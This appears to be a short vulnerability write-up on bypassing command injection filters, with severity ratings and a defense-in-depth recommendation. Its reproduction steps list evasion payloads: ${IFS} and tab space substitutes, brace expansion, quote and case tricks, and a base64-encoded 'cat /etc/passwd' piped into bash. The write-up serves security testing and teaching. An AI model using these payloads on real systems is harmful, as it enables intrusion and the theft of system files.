# Command Injection - Advanced Bypasses and Filter Evasion

**Title:** Command Injection with Space, Character and Filter Bypasses

**Severity:** Critical

**Impact:** High

**Exploitability:** High

**CVSS Base Score:** 9.8

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Vulnerability Type:** Command Injection

**Target:** Sanitized or filtered command injection points

## Impact

Bypass of input filters to achieve remote code execution.

## Description

Basic separators are blocked. Advanced techniques using encoding, case manipulation, brace expansion, and alternative characters are required.

## Steps to Reproduce

**Space bypasses (Linux):**
- `%09` (tab)
- `${IFS}` or `$IFS`
- `{ls,-la}` (brace expansion)

**Character and case manipulation:**
- `c"a"t` or `$@`
- Case: `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
- Reversal: `echo 'whoami' | rev`
- Base64: `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk...)`

See full collections in PayloadsAllTheThings for more.

## Recommendation

Implement defense in depth: input validation, output encoding, least privilege, and WAF rules. Do not rely solely on blacklisting.

## References

- PayloadsAllTheThings Command Injection (extensive bypass collections)
